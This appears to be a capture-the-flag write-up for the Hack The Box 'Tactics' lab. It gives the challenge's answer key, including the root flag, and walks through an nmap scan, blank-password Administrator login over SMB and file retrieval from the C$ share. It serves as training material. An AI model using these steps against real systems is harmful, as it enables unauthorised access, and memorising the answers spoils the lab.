@@ -1,0 +1,66 @@
+Hack The Box
+Machine: Tactics 
+Part of the Starting Point tier 1 series
+Difficulty: Very Easy
+Google Docs: https://docs.google.com/document/d/1oidJJ0I0snuPcm-g5g7CgJyhOQT3VbN5H1WYM8y-YYo/edit?usp=sharing
+
+Q1:Which nmap switch cna we use to enumerate machines when our packets are otherwise blocked by the windows firewall?
+A1: -Pn (no ping scan)
+
+Q2:What does the 3-letter acronym SMB stand for?
+A2:Server Message Block
+
+Q3: What port does SMB operate at?
+A3: 445
+
+Q4: What command line argument do you give to "smbclient" to list available shares?
+A4: -L
+
+Q5: What character at the end of a share name indicates it's an administrative share?
+A5: $
+
+Q6: What administrative share is accessible on the box that allows users to view the whole file system?
+A6: C$
+
+Q7: What command can we use to download the files we find on the SMB Share?
+A7: get
+
+Q8: Which tool that is part of impacket collection can be used to get an interactive shell on the system?
+A8: Psexec.py
+
+Q9: Submit the root flag
+A9: f751c19eda8f61ce81827e6930a1f40c
+
+
+Step 1 
+  Run nmap on the machine based on the questions they probably want us to run a no ping scan so lets see what happens. 
+  nmap -Pn <target_IP>
+  Scan Results:
+    PORT    STATE SERVICE
+    135/tcp open  msrpc
+    139/tcp open  netbios-ssn
+    445/tcp open  microsoft-ds
+  
+ Step 2: 
+  So we have identified there is an open service on port 445 which we know is used for SMB so we will try to use default credentials to see the shares
+  smbclient -L <target_IP> -U Administrator
+  Just press enter to input a blank password when prompted. By default smb Administrator password is blank.
+  Results:
+    Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        
+  Step 3:
+    The C share is the windows C drive and it has administrator authorization so we should be able to use smbclient to navigate over to it and retrieve files from it
+    smbclient \\\\<target_IP>\\C$ -U Administrator
+    
+    From here you should be able to use basic command line arguments to navigate around the file system and look for the flag. For me the find command wouldn't work 
+    so I had to look manually it was ultimately found in the \Users\Administrator\Desktop directory
+    We can use the get command with smbclient to retrieve the flag
+    from the administrator/Desktop directory enter
+    get flag.txt
+    Press Ctrl+c to exit the smb client and the flag.txt file should be in the directory you were working from
+        
+     
